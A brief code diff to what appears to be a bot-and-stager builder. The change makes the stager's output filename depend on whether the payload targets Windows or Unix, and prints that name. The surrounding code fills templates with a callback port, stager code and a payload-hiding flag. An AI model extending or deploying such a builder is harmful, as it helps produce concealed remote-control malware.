@@ -51,6 +51,8 @@ class Executor(object):
 
         payload_name = os.path.splitext(
             os.path.basename(const.PAYLOAD_PATH + const.PAYLOAD_NAME))[0]
+        
+        self.in_windows = ".exe" in const.PAYLOAD_NAME
 
         self.bot_py_temp = os.path.join('bot', payload_name + '.py')
         self.bot_compiled = os.path.join(self.dist_path,  payload_name)
@@ -106,9 +108,12 @@ class Executor(object):
             'addr_port': str(self.port),
             'block_size': repr(const.BLOCK_SIZE),
             'stager_code': repr(const.STAGER_CODE),
-            'output_file': repr(self.filename + '_.exe'),
+            'output_file': repr(self.filename + '_.exe') if self.in_windows else repr(self.filename + '_'),
             'hide_payload': str(self.hide),
         }
+
+        # handle windows vs unix systems
+        print(f"\n File for stager downloading {args['output_file']}")
 
         self.write_template(self.stager_template, self.stager_py_temp, args)
         self.move_file(self.stager_compiled, self.output_dir)
